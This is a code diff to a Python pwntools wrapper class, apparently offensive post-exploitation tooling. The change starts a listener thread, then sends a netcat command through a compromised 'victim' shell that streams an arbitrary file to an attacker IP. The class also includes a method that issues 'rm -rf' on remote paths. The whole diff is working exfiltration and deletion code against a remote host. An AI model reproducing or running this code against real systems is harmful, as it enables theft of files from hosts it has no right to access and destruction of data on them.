@@ -50,16 +50,23 @@ class PwnlibSocketWrapper:
 
         return output_remote_temporary_file
 
-    def read_remote_file(self, remote_path: str, wait_before_upload_seconds: int=3) -> str:
-        download_command = f'sleep {wait_before_upload_seconds} && nc -w 3 {self.attacker_ip} {self.netcat_file_transfer_port} < {remote_path}'.encode()
+    def read_remote_file(self, remote_path: str) -> str:
+        thread = utilities.ThreadWithReturnValue(target=self.listen_for_netcat_file_upload_from_victim)
+        thread.start()
+
+        download_command = f'nc -w 5 {self.attacker_ip} {self.netcat_file_transfer_port} < {remote_path}'.encode()
         self.client.sendline(download_command)
 
-        # TODO: run listen on separate thread before running nc on victim
+        downloaded_output = thread.join()
+        return downloaded_output.decode(self.encoding)
+
+    def listen_for_netcat_file_upload_from_victim(self) -> bytes:
         downloaded_output = None
+        pwn.context.log_level = 'error'
         with pwn.listen(self.netcat_file_transfer_port).wait_for_connection() as client:
             downloaded_output = client.recvall().strip()
 
-        return downloaded_output.decode(self.encoding)
+        return downloaded_output
 
     def delete_remote_file(self, remote_path: str):
         remove_command = f'rm -rf {remote_path}'.encode()
